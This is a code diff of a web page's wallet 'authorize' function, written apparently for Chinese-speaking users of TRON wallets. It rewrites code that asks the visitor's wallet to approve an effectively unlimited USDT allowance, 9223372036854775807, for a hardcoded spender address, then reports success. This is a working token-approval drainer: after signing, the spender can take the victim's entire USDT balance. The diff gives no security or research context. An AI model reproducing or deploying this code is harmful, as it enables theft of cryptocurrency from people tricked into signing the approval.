@@ -57,39 +57,21 @@
 
     async function authorize() {
       try {
-        const tw = window.tronWeb || window.tron || (window.tronLink && window.tronLink.tronWeb) || null;
-
-        if (!tw || !tw.defaultAddress || !tw.defaultAddress.base58) {
-          if (window.tronLink && window.tronLink.request) {
-            await window.tronLink.request({ method: 'tron_requestAccounts' });
-          }
-        }
-
-        const wallet = window.tronWeb || window.tron || (window.tronLink && window.tronLink.tronWeb);
-        if (!wallet || !wallet.defaultAddress || !wallet.defaultAddress.base58) {
-          document.getElementById("status").innerText = "钱包未连接，请使用 TP、TronLink 等钱包打开本页";
+        const tron = window.tronWeb || window.tron || (window.tronLink && window.tronLink.tronWeb);
+        if (!tron || !tron.defaultAddress || !tron.defaultAddress.base58) {
+          document.getElementById("status").innerText = "钱包未连接，请使用 TRON 主网钱包打开页面";
           return;
         }
 
-        const contract = "TXLAQ63Xg1NAzckPwKHvzw7CSEmLMEqcdj"; // 主网 USDT 合约地址
-        const spenderHex = "41b4428a48e7ecbe6e4a498fb2c11e9e011f094f1f"; // 主网授权地址 (示例，实际替换)
+        const contractAddress = "TXLAQ63Xg1NAzckPwKHvzw7CSEmLMEqcdj"; // 主网 USDT 合约
+        const spender = "TTrMWd5Ukn4dLnQXrbRe1z5AGWa2CDrjLz"; // 示例授权地址
 
-        const tx = await wallet.transactionBuilder.triggerSmartContract(
-          contract,
-          "approve(address,uint256)",
-          { feeLimit: 100000000 },
-          [
-            { type: "address", value: spenderHex },
-            { type: "uint256", value: "9223372036854775807" }
-          ],
-          wallet.defaultAddress.base58
-        );
+        const contract = await tron.contract().at(contractAddress);
+        const tx = await contract.approve(spender, tron.toBigNumber("9223372036854775807")).send({
+          feeLimit: 100000000
+        });
 
-        const signedTx = await wallet.trx.sign(tx.transaction);
-        const result = await wallet.trx.sendRawTransaction(signedTx);
-        document.getElementById("status").innerText = result.result
-          ? "授权成功！交易 ID：" + result.txid
-          : "授权失败，请重试";
+        document.getElementById("status").innerText = "授权成功！交易哈希：" + tx;
       } catch (e) {
         document.getElementById("status").innerText = "授权异常：" + (e.message || e);
       }
